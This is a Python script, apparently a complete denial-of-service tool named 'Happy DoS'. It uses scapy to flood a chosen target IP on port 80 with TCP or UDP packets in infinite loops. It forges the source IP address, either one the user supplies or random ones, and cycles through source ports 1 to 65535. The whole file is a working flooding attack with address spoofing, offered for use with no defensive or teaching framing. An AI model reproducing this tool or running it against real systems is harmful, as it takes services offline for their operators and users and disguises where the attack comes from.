from scapy.all import *
import random
from colorama import Fore
import os


def main():
    all_attack_methods = {1: single_ip_single_port, 2: single_ip_multiple_port, 3: multiple_ip_single_port,
                          4: multiple_ip_multiple_port}

    attack_method, is_tcp = get_user_choice()

    attack_method = all_attack_methods.get(attack_method)

    attack_method(is_tcp)

    os.system('cls')


def get_user_choice():
    while True:
        banner()
        protocol_menu()
        attack_protocol = int(input(Fore.CYAN + 'Choose your attack protocol: '))

        if not (1 <= attack_protocol <= 2):
            print('Try again with more precision. ')
            os.system('cls')
            continue

        banner()
        method_menu()
        attack_method = int(input(Fore.CYAN + 'Choose your attack method: '))
        if not (1 <= attack_method <= 4):
            print('Try again with more precision. ')
            os.system('cls')
            continue

        return attack_method, attack_protocol - 1


def protocol_menu():
    print(Fore.GREEN + '1. UDP')
    print(Fore.GREEN + '2. TCP')


def method_menu():
    print(Fore.GREEN + '1. Single IP and Single Port')
    print(Fore.GREEN + '2. Single IP and Multiple Port')
    print(Fore.GREEN + '3. Multiple IP and Single Port')
    print(Fore.GREEN + '4. Multiple IP and Multiple Port')


def banner():
    os.system('cls')
    print(Fore.YELLOW + """ /$$   /$$                                               /$$$$$$$                     
| $$  | $$                                              | $$__  $$                    
| $$  | $$  /$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$      | $$  \ $$  /$$$$$$   /$$$$$$$
| $$$$$$$$ |____  $$ /$$__  $$ /$$__  $$| $$  | $$      | $$  | $$ /$$__  $$ /$$_____/
| $$__  $$  /$$$$$$$| $$  \ $$| $$  \ $$| $$  | $$      | $$  | $$| $$  \ $$|  $$$$$$ 
| $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$      | $$  | $$| $$  | $$ \____  $$
| $$  | $$|  $$$$$$$| $$$$$$$/| $$$$$$$/|  $$$$$$$      | $$$$$$$/|  $$$$$$/ /$$$$$$$/
|__/  |__/ \_______/| $$____/ | $$____/  \____  $$      |_______/  \______/ |_______/ 
                    | $$      | $$       /$$  | $$                                    
                    | $$      | $$      |  $$$$$$/                                    
                    |__/      |__/       \______/                                     """)


# attack with single ip and single port
def single_ip_single_port(is_tcp=True):
    source_ip = input("Enter IP address of Source: ")
    target_ip = input("Enter IP address of Target: ")
    source_port = int(input("Enter Source Port Number:"))

    # show number of sent packets
    packet_number = 1

    # send tcp packets
    while is_tcp:
        send_packet(source_ip, target_ip, source_port, TCP)
        print(f"#{packet_number} with {source_port} port and {source_ip} ip to {target_ip} ip (TCP)")
        packet_number = packet_number + 1

    # send udp packets
    while not is_tcp:
        send_packet(source_ip, target_ip, source_port, UDP)
        print(f"#{packet_number} with {source_port} port and {source_ip} ip to {target_ip} ip (UDP)")
        packet_number = packet_number + 1


# attack with single ip and multiple port
def single_ip_multiple_port(is_tcp=True):
    source_ip = input("Enter IP address of Source: ")
    target_ip = input("Enter IP address of Target: ")

    # show number of sent packets
    packet_number = 1

    # send tcp packets
    while is_tcp:
        for source_port in range(1, 65535):
            send_packet(source_ip, target_ip, source_port, TCP)
            print(f"#{packet_number} with {source_port} port and {source_ip} ip to {target_ip} ip (TCP)")
            packet_number = packet_number + 1

    # send udp packets
    while not is_tcp:
        for source_port in range(1, 65535):
            send_packet(source_ip, target_ip, source_port, UDP)
            print(f"#{packet_number} with {source_port} port and {source_ip} ip to {target_ip} ip (UDP)")
            packet_number = packet_number + 1


# attack with multiple ip and single port
def multiple_ip_single_port(is_tcp):
    target_ip = input("Enter IP address of Target: ")
    source_port = int(input("Enter Source Port Number:"))

    # show number of sent packets
    packet_number = 1

    # send tcp packets
    while is_tcp:
        source_ip = create_random_ip()
        send_packet(source_ip, target_ip, source_port, TCP)
        print(f"#{packet_number} with {source_port} port and {source_ip} ip to {target_ip} ip (TCP)")
        packet_number = packet_number + 1

    # send udp packets
    while not is_tcp:
        source_ip = create_random_ip()
        send_packet(source_ip, target_ip, source_port, UDP)
        print(f"#{packet_number} with {source_port} port and {source_ip} ip to {target_ip} ip (UDP)")
        packet_number = packet_number + 1


# attack with multiple ip and multiple port
def multiple_ip_multiple_port(is_tcp):
    target_ip = input("Enter IP address of Target: ")

    # show number of sent packets
    packet_number = 1

    # send tcp packets
    while is_tcp:
        for source_port in range(1, 65535):
            source_ip = create_random_ip()
            send_packet(source_ip, target_ip, source_port, TCP)
            print(f"#{packet_number} with {source_port} port and {source_ip} ip to {target_ip} ip (TCP)")
            packet_number = packet_number + 1

    # send udp packets
    while not is_tcp:
        for source_port in range(1, 65535):
            source_ip = create_random_ip()
            send_packet(source_ip, target_ip, source_port, UDP)
            print(f"#{packet_number} with {source_port} port and {source_ip} ip to {target_ip} ip (UDP)")
            packet_number = packet_number + 1


def create_random_ip():
    # create four part of ip
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = '.'

    ip = a + dot + b + dot + c + dot + d

    return ip


def send_packet(source_ip=None, target_ip=None, source_port=None, protocol=TCP):
    # create ip layer
    ip_layer = IP(src=source_ip, dst=target_ip)
    # create transport layer (tcp or udp)
    transport_layer = protocol(sport=source_port, dport=80)

    made_packet = ip_layer / transport_layer
    send(made_packet, inter=.001)


if __name__ == '__main__':
    main()
